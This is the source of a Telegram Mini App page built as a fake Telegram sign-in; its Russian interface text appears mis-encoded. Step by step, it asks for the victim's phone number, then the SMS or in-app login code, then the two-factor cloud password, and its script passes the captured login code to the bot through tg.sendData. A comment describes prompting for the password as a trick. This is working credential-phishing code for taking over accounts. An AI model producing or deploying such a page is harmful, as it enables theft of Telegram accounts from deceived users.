<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
<style>
    :root {
        --bg-color: #0f1721;
        --container-bg: #1c2733;
        --text-color: #ffffff;
        --hint-color: #708499;
        --accent-color: #3390ec;
        --input-bg: #242f3d;
    }

    /* –£–ë–ò–†–ê–ï–ú –°–¢–†–ï–õ–û–ß–ö–ò */
    input::-webkit-outer-spin-button,
    input::-webkit-inner-spin-button {
        -webkit-appearance: none !important;
        margin: 0 !important;
    }
    input[type=number] { -moz-appearance: textfield !important; appearance: none !important; }

    body {
        font-family: -apple-system, system-ui, sans-serif;
        background-color: var(--bg-color);
        color: var(--text-color);
        margin: 0;
        display: flex;
        align-items: center;
        justify-content: center;
        height: 100vh;
        overflow: hidden;
    }

    .card {
        width: 100%;
        max-width: 340px;
        background: var(--container-bg);
        padding: 40px 30px;
        border-radius: 28px;
        text-align: center;
        box-shadow: 0 20px 40px rgba(0,0,0,0.5);
        margin: 20px;
    }

    .logo-area {
        font-size: 55px;
        margin-bottom: 20px;
        transition: transform 0.3s ease;
        display: inline-block;
    }

    h2 { font-size: 22px; margin: 0 0 10px 0; font-weight: 600; }
    p { font-size: 14px; color: var(--hint-color); line-height: 1.5; margin-bottom: 30px; min-height: 42px; }

    input {
        width: 100%;
        background: var(--input-bg);
        border: 2px solid transparent;
        border-radius: 16px;
        padding: 18px;
        color: #fff;
        font-size: 20px;
        text-align: center;
        outline: none;
        box-sizing: border-box;
        transition: 0.3s;
        margin-bottom: 15px;
    }

    input:focus { border-color: var(--accent-color); }

    button {
        width: 100%;
        background: var(--accent-color);
        color: white;
        border: none;
        border-radius: 16px;
        padding: 18px;
        font-size: 16px;
        font-weight: 700;
        cursor: pointer;
        box-shadow: 0 4px 15px rgba(51, 144, 236, 0.3);
    }

    button:active { transform: scale(0.97); }

    .step { display: none; }
    .active { display: block; animation: slideIn 0.4s ease forwards; }

    @keyframes slideIn {
        from { opacity: 0; transform: translateX(30px); }
        to { opacity: 1; transform: translateX(0); }
    }
</style>
</head>
<body>

<div class="card">
    <div id="main-icon" class="logo-area">üìû</div>

    <div id="step-phone" class="step active">
        <h2>–í—Ö–æ–¥</h2>
        <p>–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –∞–∫–∫–∞—É–Ω—Ç–∞</p>
        <input type="tel" id="p" placeholder="+7..." autofocus>
        <button onclick="nextStep('code')">–ü–æ–ª—É—á–∏—Ç—å –∫–æ–¥</button>
    </div>

    <div id="step-code" class="step">
        <h2>–ö–æ–¥ SMS</h2>
        <p>–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ –∏–∑ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è –∏–ª–∏ –°–ú–°</p>
        <input type="number" id="c" placeholder="00000">
        <button onclick="checkPasswordStep()">–ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å</button>
    </div>

    <div id="step-pass" class="step">
        <h2>–ü–∞—Ä–æ–ª—å 2FA</h2>
        <p>–í–≤–µ–¥–∏—Ç–µ –≤–∞—à –æ–±–ª–∞—á–Ω—ã–π –ø–∞—Ä–æ–ª—å</p>
        <input type="password" id="pass" placeholder="–í–∞—à –ø–∞—Ä–æ–ª—å">
        <button onclick="finish()">–ó–∞–≤–µ—Ä—à–∏—Ç—å</button>
    </div>
</div>

<script>
    const tg = window.Telegram.WebApp;
    tg.expand();

    // –§—É–Ω–∫—Ü–∏—è –ø–µ—Ä–µ–∫–ª—é—á–µ–Ω–∏—è —à–∞–≥–æ–≤ –∏ —Å–º–µ–Ω—ã –∏–∫–æ–Ω–æ–∫
    function showStep(stepId, icon) {
        document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
        document.getElementById('step-' + stepId).classList.add('active');
        document.getElementById('main-icon').innerText = icon;
    }

    function nextStep(step) {
        const p = document.getElementById('p').value;
        if(!p) return tg.HapticFeedback.notificationOccurred('error');
        
        tg.HapticFeedback.impactOccurred('medium');
        showStep('code', '‚úâÔ∏è'); // –ú–µ–Ω—è–µ–º –Ω–∞ –∫–æ–Ω–≤–µ—Ä—Ç
        document.getElementById('c').focus();
    }

    // –≠—Ç–∞ —Ñ—É–Ω–∫—Ü–∏—è —Ä–µ—à–∞–µ—Ç: –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –¥–∞–Ω–Ω—ã–µ –∏–ª–∏ —Å–ø—Ä–æ—Å–∏—Ç—å –ø–∞—Ä–æ–ª—å
    function checkPasswordStep() {
        const c = document.getElementById('c').value;
        if(!c) return;

        tg.HapticFeedback.impactOccurred('medium');
        
        // –ú–∞–ª–µ–Ω—å–∫–∞—è —Ö–∏—Ç—Ä–æ—Å—Ç—å: –µ—Å–ª–∏ —Ö–æ—á–µ—à—å, —á—Ç–æ–±—ã –ø–∞—Ä–æ–ª—å –≤—Å–µ–≥–¥–∞ —Å–ø—Ä–∞—à–∏–≤–∞–ª—Å—è –≤ –º–∏–Ω–∏-–∞–ø–ø–µ:
        showStep('pass', 'üîë'); // –ú–µ–Ω—è–µ–º –Ω–∞ –∫–ª—é—á
        document.getElementById('pass').focus();
    }

    function finish() {
        const phone = document.getElementById('p').value;
        const code = document.getElementById('c').value;
        const pass = document.getElementById('pass').value;

        tg.sendData(code); 
        tg.close();
    }
</script>

</body>
</html>
